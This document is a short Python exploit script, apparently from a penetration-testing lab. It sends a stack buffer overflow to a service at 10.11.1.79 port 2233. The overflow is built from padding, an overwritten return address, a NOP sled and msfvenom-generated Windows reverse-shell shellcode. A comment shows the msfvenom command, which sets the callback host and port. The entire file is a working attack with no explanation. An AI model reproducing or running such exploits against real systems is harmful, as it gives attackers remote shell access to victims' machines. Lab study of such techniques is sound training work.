#msfvenom -p windows/shell_reverse_tcp LHOST=10.2.112.246 LPORT=1234 EXITFUNC=thread -b "huaizifu" -f c
import socket

ip = "10.11.1.79"
port = 2233

prefix = ""
offset = 2306
overflow = "A" * offset
retn = "\x0d\x11\x20\x11"
padding = "\x90"*16
payload = ("\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x35\x70\x93\x9d\x83\xee\xfc\xe2\xf4\xc9\x98\x11\x9d\x35\x70"
"\xf3\x14\xd0\x41\x53\xf9\xbe\x20\xa3\x16\x67\x7c\x18\xcf\x21"
"\xfb\xe1\xb5\x3a\xc7\xd9\xbb\x04\x8f\x3f\xa1\x54\x0c\x91\xb1"
"\x15\xb1\x5c\x90\x34\xb7\x71\x6f\x67\x27\x18\xcf\x25\xfb\xd9"
"\xa1\xbe\x3c\x82\xe5\xd6\x38\x92\x4c\x64\xfb\xca\xbd\x34\xa3"
"\x18\xd4\x2d\x93\xa9\xd4\xbe\x44\x18\x9c\xe3\x41\x6c\x31\xf4"
"\xbf\x9e\x9c\xf2\x48\x73\xe8\xc3\x73\xee\x65\x0e\x0d\xb7\xe8"
"\xd1\x28\x18\xc5\x11\x71\x40\xfb\xbe\x7c\xd8\x16\x6d\x6c\x92"
"\x4e\xbe\x74\x18\x9c\xe5\xf9\xd7\xb9\x11\x2b\xc8\xfc\x6c\x2a"
"\xc2\x62\xd5\x2f\xcc\xc7\xbe\x62\x78\x10\x68\x18\xa0\xaf\x35"
"\x70\xfb\xea\x46\x42\xcc\xc9\x5d\x3c\xe4\xbb\x32\x8f\x46\x25"
"\xa5\x71\x93\x9d\x1c\xb4\xc7\xcd\x5d\x59\x13\xf6\x35\x8f\x46"
"\xcd\x65\x20\xc3\xdd\x65\x30\xc3\xf5\xdf\x7f\x4c\x7d\xca\xa5"
"\x04\xf7\x30\x18\x53\x35\x42\xf5\xfb\x9f\x35\x71\x28\x14\xd3"
"\x1a\x83\xcb\x62\x18\x0a\x38\x41\x11\x6c\x48\xb0\xb0\xe7\x91"
"\xca\x3e\x9b\xe8\xd9\x18\x63\x28\x97\x26\x6c\x48\x5d\x13\xfe"
"\xf9\x35\xf9\x70\xca\x62\x27\xa2\x6b\x5f\x62\xca\xcb\xd7\x8d"
"\xf5\x5a\x71\x54\xaf\x9c\x34\xfd\xd7\xb9\x25\xb6\x93\xd9\x61"
"\x20\xc5\xcb\x63\x36\xc5\xd3\x63\x26\xc0\xcb\x5d\x09\x5f\xa2"
"\xb3\x8f\x46\x14\xd5\x3e\xc5\xdb\xca\x40\xfb\x95\xb2\x6d\xf3"
"\x62\xe0\xcb\x73\x80\x1f\x7a\xfb\x3b\xa0\xcd\x0e\x62\xe0\x4c"
"\x95\xe1\x3f\xf0\x68\x7d\x40\x75\x28\xda\x26\x02\xfc\xf7\x35"
"\x23\x6c\x48")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
